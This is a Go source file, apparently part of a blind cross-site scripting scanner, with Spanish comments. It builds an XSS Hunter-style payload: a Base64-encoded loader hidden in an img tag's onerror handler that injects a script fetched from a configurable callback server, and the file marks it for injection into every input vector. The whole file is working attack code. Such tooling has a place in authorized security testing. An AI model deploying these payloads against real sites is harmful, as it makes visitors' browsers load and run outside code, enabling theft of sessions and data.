package xss

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
)

// XSSPayload representa un payload XSS con su metadata
type XSSPayload struct {
	ID          string `json:"id"`
	Type        string `json:"type"`
	Content     string `json:"content"`
	Vector      string `json:"vector"`
	CallbackURL string `json:"callback_url"`
}

// XSSPayloadMetadata es la metadata que se envía al servidor
type XSSPayloadMetadata struct {
	ID     string `json:"id"`
	Type   string `json:"type"`
	Vector string `json:"vector"`
}

// GeneratePayloadID genera un ID único para tracking
func GeneratePayloadID() string {
	bytes := make([]byte, 8)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

// GetAllPayloads retorna todos los payloads XSS embebidos
func GetAllPayloads(callbackServer string) []XSSPayload {
	payloads := []XSSPayload{}

	// Generar componentes comunes para los payloads de XSS Hunter
	// 1. Loader JS estándar
	jsLoader := fmt.Sprintf(`var a=document.createElement("script");a.src="%s";document.body.appendChild(a);`, callbackServer)
	// 2. Loader en Base64 (para eval(atob(...)))
	b64Loader := base64.StdEncoding.EncodeToString([]byte(jsLoader))

	// === PAYLOADS PRINCIPALES (IMG ONLY) ===
	// Solo usamos el de IMG ya que está verificado que funciona

	// Payload 1: Img OnError (Base64) - El clásico de XSS Hunter
	id1 := GeneratePayloadID()
	payloads = append(payloads, XSSPayload{
		ID:          id1,
		Type:        "img-onerror-b64",
		Vector:      "all", // Se inyectará en TODOS los vectores
		CallbackURL: callbackServer,
		Content:     fmt.Sprintf(`"><img src=x id=%s onerror=eval(atob(this.id))>`, b64Loader),
	})

	return payloads
}

// GetPayloadMetadata extrae solo la metadata de los payloads (para enviar al servidor)
func GetPayloadMetadata(payloads []XSSPayload) []XSSPayloadMetadata {
	metadata := make([]XSSPayloadMetadata, len(payloads))
	for i, p := range payloads {
		metadata[i] = XSSPayloadMetadata{
			ID:     p.ID,
			Type:   p.Type,
			Vector: p.Vector,
		}
	}
	return metadata
}
